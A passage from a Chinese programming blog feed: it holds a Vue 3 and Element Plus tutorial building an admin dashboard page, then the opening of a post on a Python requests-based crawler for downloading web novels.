[ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在main.js中修改为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//import &#x27;./assets/main.css&#x27;</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>引入完毕之后，我们可进行按需引入需要使用的组件，使用方法如下，引入input组件和button组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-input class=&quot;input&quot; v-model=&quot;input&quot; type=&quot;file&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">    &lt;el-button class=&quot;button&quot; type=&quot;primary&quot;&gt;文件处理&lt;/el-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import &#123; ElButton, ElInput &#125; from &#x27;element-plus&#x27;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">  </span><br><span class="line">  export default &#123;</span><br><span class="line">    components: &#123; ElButton,ElInput &#125;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.input &#123;</span><br><span class="line">  display: inline;</span><br><span class="line">  margin: 20px 30px;</span><br><span class="line">&#125;</span><br><span class="line">.button &#123;</span><br><span class="line">  width: 90px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112136801.png" alt="img"></p><h4 id="4，使用ElementUI组件搭建管理系统页面"><a href="#4，使用ElementUI组件搭建管理系统页面" class="headerlink" title="4，使用ElementUI组件搭建管理系统页面"></a>4，使用ElementUI组件搭建管理系统页面</h4><p>创建一个manger.vue，然后在App.vue中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import manger from &#x27;./view/manger.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;manger&gt;&lt;/manger&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>在其中用了菜单，按钮，图标，表格，分页等组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">htm,组件代码在&lt;template&gt;中</span><br><span class="line">JavaScript代码在&lt;script&gt;中</span><br><span class="line">css代码在&lt;style&gt;中</span><br><span class="line">&lt;el-row&gt;表示行    span表示占比，一共为24</span><br><span class="line">&lt;el-col&gt;表示列</span><br></pre></td></tr></table></figure><p>成品代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123;  ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123;</span><br><span class="line">  Check, </span><br><span class="line">  Close,</span><br><span class="line">    Menu,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  User,</span><br><span class="line">  Setting,</span><br><span class="line">  ShoppingBag,</span><br><span class="line">  Memo,</span><br><span class="line">  PieChart,</span><br><span class="line">  Fold,</span><br><span class="line">  ElemeFilled,</span><br><span class="line">  ChromeFilled,</span><br><span class="line">  Opportunity,</span><br><span class="line">  Edit,</span><br><span class="line">  Delete,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line"></span><br><span class="line">const value2=ref(true)</span><br><span class="line">const currentPage3 = ref(5)</span><br><span class="line">const pageSize3 = ref(100)</span><br><span class="line">const small = ref(false)</span><br><span class="line">const background = ref(false)</span><br><span class="line">const disabled = ref(false)</span><br><span class="line"></span><br><span class="line">const handleSizeChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`$&#123;val&#125; items per page`)</span><br><span class="line">&#125;</span><br><span class="line">const handleCurrentChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`current page: $&#123;val&#125;`)</span><br><span class="line">&#125;</span><br><span class="line">const input = ref(&#x27;&#x27;)</span><br><span class="line">const handleOpen = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: 1,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    email: &#x27;1111111@qq.com&#x27;,</span><br><span class="line">    phone:123456,</span><br><span class="line">    nickname:&#x27;tom1&#x27;,</span><br><span class="line">    value2:true,</span><br><span class="line">    data:&#x27;2016-05-01&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: 2,</span><br><span class="line">    name: &#x27;lin&#x27;,</span><br><span class="line">    email: &#x27;2222222@qq.com&#x27;,</span><br><span class="line">    phone:456789,</span><br><span class="line">    nickname:&#x27;lin1&#x27;,</span><br><span class="line">    value2:false,</span><br><span class="line">    data:&#x27;2016-05-02&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;full-screen-div&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;common-layout&quot;&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">          &lt;el-aside class=&quot;ce&quot;&gt;</span><br><span class="line">            &lt;h1 class=&quot;title&quot;&gt;xxx管理系统&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">            &lt;el-row class=&quot;tac&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-col :span=&quot;24&quot;&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;el-menu</span><br><span class="line">                    active-text-color=&quot;#ffd04b&quot;</span><br><span class="line">                    background-color=&quot;#344155&quot;</span><br><span class="line">                    class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">                    default-active=&quot;1&quot;</span><br><span class="line">                    text-color=&quot;#fff&quot;</span><br><span class="line">                    ref=&quot;menu&quot;</span><br><span class="line">                    @open=&quot;handleOpen&quot;</span><br><span class="line">                    @close=&quot;handleClose&quot;</span><br><span class="line">                    @click=&quot;handleMenuClick&quot;</span><br><span class="line">                  &gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;1-1&quot;&gt;</span><br><span class="line">                      &lt;template #title&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        &lt;span&gt;用户管理&lt;/span&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                      &lt;el-menu-item index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        用户列表</span><br><span class="line">                    &lt;/el-menu-item&gt;</span><br><span class="line">                    &lt;/el-sub-menu&gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;2-2&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;权限管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            权限列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;3-3&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;ShoppingBag /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;商品管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;3&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            商品列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;4-4&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Memo /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;订单管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            订单列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;5-5&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;PieChart /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;数据统计&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;5&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            数据列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                  &lt;/el-menu&gt;</span><br><span class="line">                &lt;/el-col&gt;</span><br><span class="line">              &lt;/el-row&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;/el-aside&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">            &lt;el-header&gt;</span><br><span class="line">                &lt;div class=&quot;head&quot;&gt;</span><br><span class="line">                  &lt;el-icon&gt;&lt;Fold /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;首页&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt; </span><br><span class="line">                  &lt;span&gt;用户列表&lt;/span&gt;</span><br><span class="line">                  &lt;div class=&quot;components&quot;&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ElemeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ChromeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;Opportunity /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &lt;/el-header&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &lt;el-main&gt;</span><br><span class="line">              &lt;div class=&quot;main1&quot;&gt;</span><br><span class="line">                &lt;el-row :span=&quot;2&quot; &gt;</span><br><span class="line">                  &lt;el-col :span=&quot;6&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-input v-model=&quot;input&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;3&quot;  class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;添加用户&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;el-row :span=&quot;15&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;el-table :data=&quot;tableData&quot; border style=&quot;width: 100%&quot;&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;id&quot; label=&quot;#&quot; width=&quot;60&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;email&quot; label=&quot;Email&quot; width=&quot;180&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;phone&quot; label=&quot;Phone&quot; width=&quot;130&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;nickname&quot; label=&quot;NickNmae&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column  label=&quot;State&quot; width=&quot;150&quot; v-slot=&quot;&#123;row&#125;&quot;  &gt;</span><br><span class="line">                      &lt;el-switch</span><br><span class="line">                          v-model=&quot;row.value2&quot;</span><br><span class="line">                          class=&quot;mt-2&quot;</span><br><span class="line">                          style=&quot;margin-left: 24px&quot;</span><br><span class="line">                          inline-prompt</span><br><span class="line">                          :active-icon=&quot;Check&quot;</span><br><span class="line">                          :inactive-icon=&quot;Close&quot;</span><br><span class="line">                        /&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;data&quot; label=&quot;CreateData&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column label=&quot;操作&quot;&gt;</span><br><span class="line">                      &lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#589DF6&quot;&gt;&lt;el-icon color=&quot;#FFFFFF&quot; &gt;&lt;Edit/&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#E47471&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Delete /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#DCA452&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                  &lt;/el-table&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-row :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;div class=&quot;demo-pagination-block&quot;&gt;</span><br><span class="line">                    &lt;el-pagination</span><br><span class="line">                      v-model:current-page=&quot;currentPage3&quot;</span><br><span class="line">                      v-model:page-size=&quot;pageSize3&quot;</span><br><span class="line">                      :small=&quot;small&quot;</span><br><span class="line">                      :disabled=&quot;disabled&quot;</span><br><span class="line">                      :background=&quot;background&quot;</span><br><span class="line">                      layout=&quot;prev, pager, next, jumper&quot;</span><br><span class="line">                      :total=&quot;1000&quot;</span><br><span class="line">                      @size-change=&quot;handleSizeChange&quot;</span><br><span class="line">                      @current-change=&quot;handleCurrentChange&quot;</span><br><span class="line">                    /&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">              &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/el-main&gt;</span><br><span class="line">          &lt;/el-container&gt;</span><br><span class="line">        &lt;/el-container&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.full-screen-div &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    background-color: white;</span><br><span class="line">    z-index: 9999;</span><br><span class="line">&#125;</span><br><span class="line">.ce&#123;</span><br><span class="line">    width: 15vw;</span><br><span class="line">    height: 100vh;</span><br><span class="line">    background: #344155;</span><br><span class="line">&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">    padding-top: 15px;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    color: white;</span><br><span class="line">    text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.head&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    padding-top: 30px;</span><br><span class="line">    padding-bottom: 13px;</span><br><span class="line">    border-bottom: 1px solid black;</span><br><span class="line">    font-family: &#x27;黑体&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">.components &#123;  </span><br><span class="line">  position: absolute;  </span><br><span class="line">  top: 10px;</span><br><span class="line">  right: 30px;  </span><br><span class="line">  align-items: center;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">.component &#123;  </span><br><span class="line">  width: 50px;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin-right: 30px;  </span><br><span class="line">&#125;</span><br><span class="line">.main1 &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 80%;</span><br><span class="line">  border-bottom: 10px solid #EBEBEB; /* 设置下边框的宽度、样式和颜色 */  </span><br><span class="line">  box-shadow: 0 2px 3px #EBEBEB; /* 在下边框上添加阴影 */</span><br><span class="line">&#125;</span><br><span class="line">.center&#123;</span><br><span class="line">  display: flex;  </span><br><span class="line">  justify-content: center; /* 水平居中 */</span><br><span class="line">  padding-bottom: 20px;</span><br><span class="line">  padding-top: 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141494.png" alt="image-20231211212056199"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，要使用vue前先下载node-js&quot;&gt;&lt;a href=&quot;#1，要使用vue前先下载node-js&quot; class=&quot;headerlink&quot; title=&quot;1，要使用vue前先下载node.js&quot;&gt;&lt;/a&gt;1，要使用vue前先下载node.js&lt;/h4&gt;&lt;p&gt;下载</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十五，python爬虫-小说下载器</title>
    <link href="http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <id>http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/</id>
    <published>2023-12-08T13:10:21.000Z</published>
    <updated>2023-12-08T13:20:52.895Z</updated>
    
    <content type="html"><![CDATA[<p>​用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：</p><p>1，先下载该程序所需的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先到Python的安装目录的Scripts文件夹下，进入cmd命令窗口</span><br><span class="line"># requests库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ requests</span><br><span class="line"># lxml库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ lxml</span><br><span class="line"># urllib库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ urllib</span><br><span class="line"># prettytable库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ prettytable</span><br><span class="line"># pyinstaller 库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ pyinstaller</span><br></pre></td></tr></table></figure><p>2，因为爬虫需要多次请求网站并且获取回复，所以创建novel0.py，先封装一个get请求获取response的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 公共方法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 输入url用get方法获取response</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_response</span>(<span class="params">url</span>):</span><br><span class="line">    headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Hm_lvt_dd315b2f7503b4902afb3af0c37c3847=1700455793,1701781492; clickbids=78909; bcolor=; font=; size=; fontcolor=; width=; Hm_lpvt_dd315b2f7503b4902afb3af0c37c3847=1701781516&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>​    